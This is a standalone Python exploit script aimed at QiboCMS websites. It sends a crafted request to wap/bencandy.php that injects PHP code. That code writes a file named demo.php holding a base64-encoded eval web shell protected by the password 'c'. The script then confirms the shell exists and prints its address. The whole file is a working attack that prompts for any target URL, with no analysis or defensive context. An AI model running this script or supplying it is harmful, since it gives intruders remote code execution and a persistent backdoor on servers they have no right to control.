import urllib
import requests
import sys

def get_web_code(url):
    r = requests.get(url)
    status = r.status_code
    if status != 200:
        print("Web Open Error",status)
    else:
        print(" [+] ",url)


def attack_qibocms(url):
    payload_code = '''/wap/bencandy.php?fid=3&id=599&content=<?php ${fputs(fopen(base64_decode(ZGVtby5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))}?>'''
    if_file_exists = '/cache/bencandy_cache/0/599_1.php'
    get_web_code(url)
    requests.get(url+payload_code)
    acc_file = requests.get(url+if_file_exists)
    acc_status = acc_file.status_code
    if acc_status == 200:
        print("Attack Seccess:",url+if_file_exists[0:24]+"demo.php","Password: c")
    else:
        print("Fail")


if __name__ == '__main__':
    print("Usage:", sys.argv[0], "http://127.0.0.1")
    url = input("Input Target Address:")
    attack_qibocms(url)


